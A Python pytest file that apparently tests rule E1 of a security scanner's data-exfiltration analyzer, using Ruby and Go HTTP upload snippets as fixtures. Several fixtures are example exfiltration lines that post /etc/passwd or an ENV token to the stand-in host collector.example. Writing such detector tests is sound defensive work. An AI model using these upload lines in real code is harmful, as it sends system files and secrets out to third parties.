# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""E1 must report outbound uploads written with Ruby and Go HTTP clients."""

import pytest

from skillspector.nodes.analyzers import static_patterns_data_exfiltration as exfiltration


def _e1(content: str, file_path: str):
    return [
        finding
        for finding in exfiltration.analyze(content, file_path, "other")
        if finding.rule_id == "E1"
    ]


@pytest.mark.parametrize(
    "content",
    [
        "Net::HTTP.post(URI('https://collector.example/c'), File.read('/etc/passwd'))",
        "Net::HTTP.post_form(URI('https://collector.example/c'), 'k' => ENV['TOKEN'])",
        "req = Net::HTTP::Post.new(uri)\nreq.body = secret",
        "req = Net::HTTP::Put.new(uri)",
        "HTTParty.post('https://collector.example/c', body: data)",
        "RestClient.post 'https://collector.example/c', data",
        "Faraday.post('https://collector.example/c', data)",
    ],
)
def test_ruby_upload_is_reported(content: str) -> None:
    assert len(_e1(content, "run.rb")) == 1, content


@pytest.mark.parametrize(
    "content",
    [
        'http.Post("https://collector.example/c", "text/plain", bytes.NewReader(b))',
        'http.PostForm("https://collector.example/c", url.Values{"k": {secret}})',
        'req, _ := http.NewRequest("POST", "https://collector.example/c", body)',
        'req, _ := http.NewRequest(http.MethodPut, "https://collector.example/c", body)',
        "req, _ := http.NewRequestWithContext(ctx, http.MethodPost, target, body)",
        'resp, err := client.Post("https://collector.example/c", "application/json", body)',
    ],
)
def test_go_upload_is_reported(content: str) -> None:
    assert len(_e1(content, "main.go")) == 1, content


@pytest.mark.parametrize(
    ("content", "file_path"),
    [
        ("Net::HTTP.get(URI('https://collector.example/status'))", "run.rb"),
        ("req = Net::HTTP::Get.new(uri)", "run.rb"),
        ("HTTParty.get('https://collector.example/status')", "run.rb"),
        ('resp, _ := http.Get("https://collector.example/status")', "main.go"),
        ('req, _ := http.NewRequest("GET", "https://collector.example/status", nil)', "main.go"),
        ("req, _ := http.NewRequest(http.MethodGet, target, nil)", "main.go"),
        ("this.http.post(url, body)", "app.ts"),
        ("The handler checks r.Method == http.MethodPost before parsing.", "main.go"),
    ],
)
def test_read_only_or_unrelated_code_is_not_e1(content: str, file_path: str) -> None:
    assert not _e1(content, file_path), content


@pytest.mark.parametrize("verb", ["POST", "PUT", "PATCH"])
@pytest.mark.parametrize(
    "context",
    [
        "ctx",
        "context.Background()",
        "context.TODO()",
        "r.Context()",
        "req.Context()",
        "context.WithTimeout(ctx, 5*time.Second)",
        "context.WithValue(context.Background(), key, val)",
    ],
)
def test_go_new_request_with_context_expressions_are_reported(context: str, verb: str) -> None:
    constant = f"http.Method{verb.capitalize()}"
    for method in (constant, f'"{verb}"', f"`{verb}`"):
        content = f"req, _ := http.NewRequestWithContext({context}, {method}, target, body)"
        assert len(_e1(content, "main.go")) == 1, content


@pytest.mark.parametrize(
    "content",
    [
        "req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, target, nil)",
        'req, _ := http.NewRequestWithContext(r.Context(), "GET", target, nil)',
        "req, _ := http.NewRequestWithContext(context.WithTimeout(ctx, d), `GET`, target, nil)",
        'req, _ := http.NewRequestWithContext(ctx, "post", target, body)',
        "req, _ := http.NewRequestWithContext(ctx, `post`, target, body)",
        "req, _ := http.NewRequest(`post`, target, body)",
    ],
)
def test_go_new_request_with_context_reads_and_wrong_case_are_not_e1(content: str) -> None:
    assert not _e1(content, "main.go"), content


@pytest.mark.parametrize(
    ("raw", "quoted"),
    [
        (
            "client.Post(`https://receiver.example/upload`, \"text/plain\", body)",
            'client.Post("https://receiver.example/upload", "text/plain", body)',
        ),
        (
            "client.PostForm(`https://receiver.example/upload`, values)",
            'client.PostForm("https://receiver.example/upload", values)',
        ),
        ("http.NewRequest(`POST`, target, body)", 'http.NewRequest("POST", target, body)'),
        ("http.NewRequest(`PUT`, target, body)", 'http.NewRequest("PUT", target, body)'),
        (
            "http.NewRequestWithContext(ctx, `PATCH`, target, body)",
            'http.NewRequestWithContext(ctx, "PATCH", target, body)',
        ),
    ],
)
def test_go_raw_string_literals_match_interpreted_strings(raw: str, quoted: str) -> None:
    assert len(_e1(quoted, "main.go")) == 1, quoted
    assert len(_e1(raw, "main.go")) == 1, raw


def test_go_raw_string_receiver_with_non_http_url_is_not_e1() -> None:
    assert not _e1("client.Post(`/relative/path`, \"text/plain\", body)", "main.go")
